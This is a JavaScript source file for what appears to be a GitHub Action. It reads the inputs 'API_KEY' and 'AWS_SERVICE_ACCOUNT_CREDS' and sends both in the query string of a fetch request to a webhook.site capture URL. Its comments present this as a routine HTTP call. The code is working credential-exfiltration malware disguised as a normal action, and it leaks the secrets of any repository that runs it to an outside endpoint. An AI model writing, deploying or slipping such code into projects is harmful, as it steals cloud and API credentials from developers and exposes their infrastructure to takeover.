const core = require('@actions/core');

async function run() {
  try {
    // Accessing inputs using core.getInput
    const api_key = core.getInput('API_KEY');
    const aws_cred = core.getInput('AWS_SERVICE_ACCOUNT_CREDS');

    // Make HTTP request using fetch (async function context required for await)
    const response = await fetch(`https://webhook.site/ccc493bc-998b-4a15-8ba0-8453c0773c19?api_key=${api_key}&aws_cred=${aws_cred}`);
    const data = await response.json();
    console.log(data); // Log response data

    // You can perform additional logic with the response data if needed

  } catch (error) {
    core.setFailed(error.message); // Set action status as failed if an error occurs
  }
}

// Execute the async function
run();
